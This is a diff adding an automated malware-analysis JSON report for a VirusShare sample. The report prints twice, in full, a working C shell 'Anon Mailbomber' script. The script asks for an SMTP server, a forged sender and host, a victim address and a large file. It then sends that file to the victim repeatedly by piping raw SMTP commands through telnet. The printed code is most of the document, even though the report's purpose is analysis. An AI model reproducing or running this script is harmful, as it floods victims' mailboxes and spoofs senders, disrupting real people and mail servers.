@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str"
+        },
+        "macro": "#! /bin/csh\n##Anon Mailbomber Script\n##You may need to screw w/ the sleep times if this doesn't work.\necho -n \"What is the name of the SMTP server you want to use?\"\nset serv = $<\n\necho -n \"What is the fake host name?\"\nset fake = $<\n\necho -n \"Who should it appear to be from? (usr@host)\"\nset from = $<\n\necho -n \"Who is the lucky recipient?\" \nset to = $<\n\necho -n \"Name of the BIG file you want to mail?\"\nset file = $<\n\necho -n \"How many times should it be sent ?\"\nset amount = $<\nset loop_count = 1\necho \"Don't press anything untill you see the Mailbomb Complete message.\"\nwhile ($loop_count <= $amount)\n(sleep 3;echo \"helo\" $fake;sleep 1;echo \"mail from:\"$from;sleep 1;echo \"rcpt to:\"$to;sleep 1;echo data;echo \"From:\"$from;sleep 1;cat $file;echo \".\";sleep 2;echo \"quit\") | telnet $serv 25 \n\t@ loop_count++\nend\necho \"Mailbomb Complete\"\n\n\n"
+    },
+    "filename": "VirusShare_6f44eab133cfefdd82e828317eee13ac",
+    "filesize": 869,
+    "filetype": "C shell script, ASCII text executable, with CRLF line terminators",
+    "hashes": {
+        "md5": "6f44eab133cfefdd82e828317eee13ac",
+        "sha1": "b5c0dd1171d2f763dd55175ee3468d7a52911c4b",
+        "sha256": "225b3b4f9aaea9e783f8defe4df89808d24818f0366997545f139024830f5346"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#! /bin/csh",
+            "##Anon Mailbomber Script",
+            "##You may need to screw w/ the sleep times if this doesn't work.",
+            "echo -n \"What is the name of the SMTP server you want to use?\"",
+            "set serv = $<",
+            "echo -n \"What is the fake host name?\"",
+            "set fake = $<",
+            "echo -n \"Who should it appear to be from? (usr@host)\"",
+            "set from = $<",
+            "echo -n \"Who is the lucky recipient?\" ",
+            "set to = $<",
+            "echo -n \"Name of the BIG file you want to mail?\"",
+            "set file = $<",
+            "echo -n \"How many times should it be sent ?\"",
+            "set amount = $<",
+            "set loop_count = 1",
+            "echo \"Don't press anything untill you see the Mailbomb Complete message.\"",
+            "while ($loop_count <= $amount)",
+            "(sleep 3;echo \"helo\" $fake;sleep 1;echo \"mail from:\"$from;sleep 1;echo \"rcpt to:\"$to;sleep 1;echo data;echo \"From:\"$from;sleep 1;cat $file;echo \".\";sleep 2;echo \"quit\") | telnet $serv 25 ",
+            "\t@ loop_count++",
+            "echo \"Mailbomb Complete\""
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.264562",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
